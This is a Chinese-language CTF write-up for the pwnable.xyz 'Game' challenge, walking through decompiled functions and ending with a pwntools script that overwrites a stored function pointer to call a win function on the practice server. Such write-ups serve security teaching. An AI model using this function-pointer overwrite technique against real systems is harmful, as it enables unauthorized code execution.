---
title: pwnable_Game
date: 2019-12-29 21:30:58
tags: 
- pwn
- pwnable.xyz
---

# pwnable.xyz  Game 

### 0x1 分析

老样子，看一下安全选项：

![](https://i.loli.net/2019/12/29/iIE8L4hBOQokp5D.png)

看起来，可以利用一下地址，也许还可以利用一下GOT也说不定。

拿来看一下`main`函数吧：

```c
// local variable allocation has failed, the output may be wrong!
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  signed int v3; // eax

  setup(*(_QWORD *)&argc, argv, envp);
  puts("Shell we play a game?");
  init_game("Shell we play a game?");
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      printf("> ");
      v3 = read_int32();
      if ( v3 != 1 )
        break;
      (*((void (**)(void))cur + 3))();
    }
    if ( v3 > 1 )
    {
      if ( v3 == 2 )
      {
        save_game();
      }
      else
      {
        if ( v3 != 3 )
          goto LABEL_13;
        edit_name();
      }
    }
    else
    {
      if ( !v3 )
        exit(1);
LABEL_13:
      puts("Invalid");
    }
  }
}
```

首先我们会进入`init_game`函数:

```c
char *init_game()
{
  char *result; // rax

  saves[0] = (__int64)malloc(0x20uLL);
  cur = (char *)find_last_save(32LL);
  printf("Name: ");
  read(0, cur, 0x10uLL);
  result = cur;
  *((_QWORD *)cur + 3) = play_game;
  return result;
}
```

看起来没什么头绪呢。

再往下看吧。

这里我们发现，当选择`1`菜单的时候，调用了`cur+3`这个位置的函数。并且，刚才我们发现`init_game`函数里，这个位置存储的是`play_game`函数的起始位置。

`play_game`:

```c
unsigned __int64 play_game()
{
  __int16 v0; // dx
  __int16 v1; // dx
  __int16 v2; // dx
  __int16 v3; // dx
  int v5; // [rsp-12Ch] [rbp-12Ch]
  int v6; // [rsp-128h] [rbp-128h]
  unsigned int v7; // [rsp-124h] [rbp-124h]
  unsigned int v8; // [rsp-120h] [rbp-120h]
  unsigned __int8 v9; // [rsp-11Ch] [rbp-11Ch]
  __int64 v10; // [rsp-118h] [rbp-118h]
  unsigned __int64 v11; // [rsp-10h] [rbp-10h]

  v11 = __readfsqword(0x28u);
  v5 = open("/dev/urandom", 0);
  if ( v5 == -1 )
  {
    puts("Can't open /dev/urandom");
    exit(1);
  }
  read(v5, &v7, 0xCuLL);
  close(v5);
  v9 &= 3u;
  memset(&v10, 0, 0x100uLL);
  snprintf((char *)&v10, 0x100uLL, "%u %c %u = ", v7, (unsigned int)ops[v9], v8);
  printf("%s", &v10);
  v6 = read_int32();
  if ( v9 == 1 )
  {
    if ( v7 - v8 == v6 )
      v1 = *((_WORD *)cur + 8) + 1;
    else
      v1 = *((_WORD *)cur + 8) - 1;
    *((_WORD *)cur + 8) = v1;
  }
  else if ( (signed int)v9 > 1 )
  {
    if ( v9 == 2 )
    {
      if ( v7 / v8 == v6 )
        v2 = *((_WORD *)cur + 8) + 1;
      else
        v2 = *((_WORD *)cur + 8) - 1;
      *((_WORD *)cur + 8) = v2;
    }
    else if ( v9 == 3 )
    {
      if ( v8 * v7 == v6 )
        v3 = *((_WORD *)cur + 8) + 1;
      else
        v3 = *((_WORD *)cur + 8) - 1;
      *((_WORD *)cur + 8) = v3;
    }
  }
  else if ( !v9 )
  {
    if ( v8 + v7 == v6 )
      v0 = *((_WORD *)cur + 8) + 1;
    else
      v0 = *((_WORD *)cur + 8) - 1;
    *((_WORD *)cur + 8) = v0;
  }
  return __readfsqword(0x28u) ^ v11;
}
```

这里貌似只是一个加减乘除的游戏。往下面看吧。

菜单`2`的时候，进入了`save_game`函数：

`save_game`:

```c
int save_game()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  __int64 v2; // rdx
  __int64 v3; // rax
  signed int i; // [rsp-Ch] [rbp-Ch]

  for ( i = 1; i <= 4; ++i )
  {
    if ( !saves[i] )
    {
      saves[i] = (__int64)malloc(0x20uLL);
      v0 = (_QWORD *)saves[i];
      v1 = *((_QWORD *)cur + 1);
      *v0 = *(_QWORD *)cur;
      v0[1] = v1;
      *(_QWORD *)(saves[i] + 16) = *((signed __int16 *)cur + 8);
      *(_QWORD *)(saves[i] + 24) = play_game;
      v2 = i;
      v3 = saves[v2];
      cur = (char *)saves[v2];
      return v3;
    }
  }
  LODWORD(v3) = puts("Not enough space.");
  return v3;
}
```

这里我们发现`cur`这个位置存进了`24`字节的内容。

接下来我们看一下菜单`3`干了什么。

`edit_name`:

```c
ssize_t edit_name()
{
  size_t v0; // rax

  v0 = strlen(cur);
  return read(0, cur, v0);
}
```

这里也许可以覆盖一些东西。

### 0x2 思路

我们发现菜单`3`可以覆盖`cur`的内容。

而且，菜单`1`并不是直接调用`play_game`函数的。而是通过`cur+3`才调用的。那么我们可以考虑覆盖`cur+3`来调用`win`。

但是。我们发现正常输入的情况下，`cur`字符串的长度并足以延伸到`cur+3`,这样的话我们就没办法用菜单`3`来覆盖`cur`了。

所以我们要用到菜单`2`的函数来扩充`cur`。

### 0x3 代码

```python
#coding:utf-8
from pwn import *
context.log_level="debug"

p=remote("svc.pwnable.xyz",30009)
p.sendlineafter("Name: ","11111111111111111")
p.sendlineafter("= ","1")

p.sendlineafter("> ","2")
p.sendlineafter("> ","3")
p.send("1"*0x18+p64(0x4009D6)[:3])

p.interactive()
```

